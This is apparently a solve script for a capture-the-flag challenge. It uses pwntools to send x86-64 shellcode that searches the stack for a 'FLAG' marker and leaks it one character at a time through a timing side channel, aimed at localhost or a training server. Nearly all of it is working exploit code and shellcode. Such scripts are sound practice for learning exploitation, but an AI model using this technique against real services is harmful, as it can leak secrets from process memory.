#!/usr/bin/env python3

from pwn import *
import time
from string import ascii_lowercase, ascii_uppercase, digits

context.arch = "amd64"
context.terminal = ["alacritty", "-e", "fish", "-c"]
exe = ELF("./chall")

gdbscript = """
    continue
"""

# r = gdb.debug(["./chall"], gdbscript=gdbscript)
# r = process("./chall")

context.log_level = "critical"
flag = ""

alphabet = ascii_lowercase + ascii_uppercase + digits + "{}" + "_"

while True:
    for a in alphabet:
        start = time.monotonic()
        r = remote("localhost", 1337)
        # r = remote("training.theromanxpl0.it", 42040)
        r.clean(timeout=0.2)

        c = ord(a)

        payload = asm(f"""
        mov rsi, rsp
        search:
            inc rsi
            cmp byte ptr [rsi], 0x46 
            jne search
    
            cmp dword ptr [rsi], 0x47414c46 
            jne search

            add rsi, {5 + len(flag)}    

        cmp byte ptr [rsi], {c} 
        jne exit

        .lab:
            pause
            jmp .lab

        mov rcx, 0xffffffff
        s1:
            dec rcx
            cmp rcx, 0x00
            jmp s1

        mov rcx, 0xffffffff
        s2:
            dec rcx
            cmp rcx, 0x00
            jne s2  

        mov rcx, 0xffffffff
        s3:
            dec rcx
            cmp rcx, 0x00
            jne s3

        exit:
        """)

        r.sendline(f"{len(payload)}".encode())
        r.send(payload.ljust(512, b"\x90"))
        data = r.recvall(timeout=1)

        elapsed = time.monotonic() - start
        print(f"{a}: {elapsed}")
        if (elapsed > 1):
            flag += a
            print(flag)

